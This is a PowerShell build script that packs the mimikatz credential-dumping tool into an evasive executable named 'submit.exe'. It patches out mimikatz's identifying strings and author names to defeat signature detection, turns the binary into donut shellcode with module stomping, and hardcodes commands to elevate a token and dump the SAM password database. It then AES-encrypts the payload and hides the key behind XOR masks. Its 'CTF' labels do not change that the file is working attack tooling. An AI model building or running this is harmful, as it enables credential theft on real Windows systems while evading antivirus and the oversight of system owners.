$ErrorActionPreference = 'Stop'
$root = Split-Path -Parent $MyInvocation.MyCommand.Path
$build = Join-Path $root 'build'
$work = Join-Path $build '.work'
$source = Join-Path $root 'src\Loader.cs'
$donut = Join-Path $root 'tools\donut\donut.exe'
$payloadSource = Join-Path $root 'sample\mimikatz.exe'
$compiler = 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe'
$payload = Join-Path $work 'module.exe'
$raw = Join-Path $work 'stage.bin'
$encrypted = Join-Path $work 'stage.dat'
$materialSource = Join-Path $work 'Material.g.cs'
$output = Join-Path $build 'submit.exe'

foreach ($required in @($source, $donut, $payloadSource, $compiler)) {
    if (-not (Test-Path -LiteralPath $required)) {
        throw "Required build file is missing: $required"
    }
}

New-Item -ItemType Directory -Force -Path $build | Out-Null
if (Test-Path -LiteralPath $work) {
    Remove-Item -LiteralPath $work -Recurse -Force
}
New-Item -ItemType Directory -Path $work | Out-Null

function Replace-Bytes([byte[]] $Buffer, [byte[]] $From, [byte[]] $To) {
    if ($From.Length -ne $To.Length) {
        throw 'Replacement length mismatch.'
    }
    for ($offset = 0; $offset -le $Buffer.Length - $From.Length; $offset++) {
        $matched = $true
        for ($index = 0; $index -lt $From.Length; $index++) {
            if ($Buffer[$offset + $index] -ne $From[$index]) {
                $matched = $false
                break
            }
        }
        if ($matched) {
            [Array]::Copy($To, 0, $Buffer, $offset, $To.Length)
            $offset += $From.Length - 1
        }
    }
}

function Join-Bytes([byte[]] $Bytes) {
    return (($Bytes | ForEach-Object { $_.ToString() }) -join ',')
}

$moduleBytes = $null
$plainBytes = $null
$cipherBytes = $null
$key = $null
$iv = $null
$keyMask = $null
$ivMask = $null
$keyEncoded = $null
$ivEncoded = $null

try {
    $moduleBytes = [IO.File]::ReadAllBytes($payloadSource)
    $pairs = @(
        @('mimikatz', 'memiload'),
        @('MIMIKATZ', 'MEMILOAD'),
        @('gentilkiwi', 'redteamlab'),
        @('GENTILKIWI', 'REDTEAMLAB'),
        @('GentilKiwi', 'RedTeamLab'),
        @('Benjamin DELPY', 'Internal CTF!!'),
        @('Vincent LE TOUX', 'Authorized CTF!'),
        @('mimidrv', 'ctfdrv0'),
        @('mimilib', 'ctfmod0'),
        @('mimispool', 'ctfspool0')
    )
    foreach ($pair in $pairs) {
        Replace-Bytes $moduleBytes `
            ([Text.Encoding]::ASCII.GetBytes($pair[0])) `
            ([Text.Encoding]::ASCII.GetBytes($pair[1]))
        Replace-Bytes $moduleBytes `
            ([Text.Encoding]::Unicode.GetBytes($pair[0])) `
            ([Text.Encoding]::Unicode.GetBytes($pair[1]))
    }
    [IO.File]::WriteAllBytes($payload, $moduleBytes)
    [Array]::Clear($moduleBytes, 0, $moduleBytes.Length)

    & $donut `
        -a 2 `
        -b 1 `
        -e 3 `
        -t `
        -z 4 `
        -x 3 `
        -j 'C:\Windows\System32\windows.storage.dll' `
        -o $raw `
        -p 'privilege::debug token::elevate lsadump::sam' `
        -i $payload
    if ($LASTEXITCODE -ne 0 -or -not (Test-Path -LiteralPath $raw)) {
        throw 'Payload conversion failed.'
    }

    $rng = [Security.Cryptography.RandomNumberGenerator]::Create()
    $key = New-Object byte[] 32
    $iv = New-Object byte[] 16
    $keyMask = New-Object byte[] 32
    $ivMask = New-Object byte[] 16
    try {
        $rng.GetBytes($key)
        $rng.GetBytes($iv)
        $rng.GetBytes($keyMask)
        $rng.GetBytes($ivMask)
    }
    finally {
        $rng.Dispose()
    }

    $keyEncoded = New-Object byte[] 32
    $ivEncoded = New-Object byte[] 16
    for ($index = 0; $index -lt $key.Length; $index++) {
        $keyEncoded[$index] = $key[$index] -bxor $keyMask[$index]
    }
    for ($index = 0; $index -lt $iv.Length; $index++) {
        $ivEncoded[$index] = $iv[$index] -bxor $ivMask[$index]
    }

    $aes = [Security.Cryptography.Aes]::Create()
    try {
        $aes.KeySize = 256
        $aes.BlockSize = 128
        $aes.Mode = [Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [Security.Cryptography.PaddingMode]::PKCS7
        $aes.Key = $key
        $aes.IV = $iv
        $plainBytes = [IO.File]::ReadAllBytes($raw)
        $transform = $aes.CreateEncryptor()
        try {
            $cipherBytes = $transform.TransformFinalBlock(
                $plainBytes, 0, $plainBytes.Length)
            [IO.File]::WriteAllBytes($encrypted, $cipherBytes)
        }
        finally {
            $transform.Dispose()
        }
    }
    finally {
        $aes.Dispose()
    }

    $keyA = Join-Bytes $keyEncoded
    $keyB = Join-Bytes $keyMask
    $ivA = Join-Bytes $ivEncoded
    $ivB = Join-Bytes $ivMask
    $generated = @"
internal static class Material
{
    internal static byte[] Key()
    {
        byte[] a = new byte[] { $keyA };
        byte[] b = new byte[] { $keyB };
        for (int i = 0; i < a.Length; i++) a[i] ^= b[i];
        return a;
    }

    internal static byte[] Iv()
    {
        byte[] a = new byte[] { $ivA };
        byte[] b = new byte[] { $ivB };
        for (int i = 0; i < a.Length; i++) a[i] ^= b[i];
        return a;
    }
}
"@
    [IO.File]::WriteAllText(
        $materialSource, $generated, [Text.UTF8Encoding]::new($false))

    & $compiler `
        /nologo `
        /target:exe `
        /platform:x64 `
        /optimize+ `
        /debug- `
        "/out:$output" `
        "/resource:$encrypted,p" `
        $source `
        $materialSource
    if ($LASTEXITCODE -ne 0 -or -not (Test-Path -LiteralPath $output)) {
        throw 'Compilation failed.'
    }
}
finally {
    foreach ($buffer in @(
            $moduleBytes, $plainBytes, $cipherBytes, $key, $iv,
            $keyMask, $ivMask, $keyEncoded, $ivEncoded)) {
        if ($null -ne $buffer) {
            [Array]::Clear($buffer, 0, $buffer.Length)
        }
    }
    if (Test-Path -LiteralPath $work) {
        Remove-Item -LiteralPath $work -Recurse -Force
    }
}

$hash = (Get-FileHash -LiteralPath $output -Algorithm SHA256).Hash
$item = Get-Item -LiteralPath $output
Write-Output "Output: $($item.FullName)"
Write-Output "Size:   $($item.Length) bytes"
Write-Output "SHA256: $hash"
